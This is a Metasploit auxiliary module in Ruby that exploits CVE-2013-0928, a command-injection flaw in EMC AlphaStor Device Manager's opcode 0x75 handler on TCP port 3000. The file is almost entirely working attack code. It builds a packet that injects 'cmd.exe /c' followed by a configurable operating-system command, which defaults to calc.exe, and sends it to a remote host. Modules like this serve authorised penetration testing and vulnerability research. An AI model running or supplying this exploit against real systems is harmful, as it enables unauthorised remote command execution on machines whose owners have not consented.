require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC AlphaStor Device Manager Opcode 0x75',
      'Description'    => %q{
        This module exploits a design flaw within the Device
        Manager (rrobtd.exe) which listens on port 3000. When
        parsing the 0x75 command, the process does not properly
        filter user supplied input allowing for arbitrary command
        injection.
      },
      'Author'         => [
                  'Preston Thornburn',  # prestonthornburg@gmail.com
                  'Mohsan Farid',       # faridms@gmail.com
                  'Brent Morris'        # inkrypto@gmail.com
                  ],
      'License'        => MSF_LICENSE,
      'Version'        => '$Revision: $',
      'References'     =>
        [
          [ 'CVE', '2013-0928' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-033/' ]
        ],
      'DisclosureDate' => 'Jan 18 2013'))

    register_options(
      [
        OptString.new('CMD', [ false, 'The OS command to execute', 'calc.exe']),
        Opt::RPORT(3000)
      ], self.class )
  end

  def run
    connect

    padding = "\x41" * 512

    packet = "\x75~ mminfo &cmd.exe /c #{datastore['CMD']} #{padding}"

    print_status("Sending command \'#{datastore['CMD']}\' to the remote host...")

    sock.put(packet)

    disconnect
  end

end
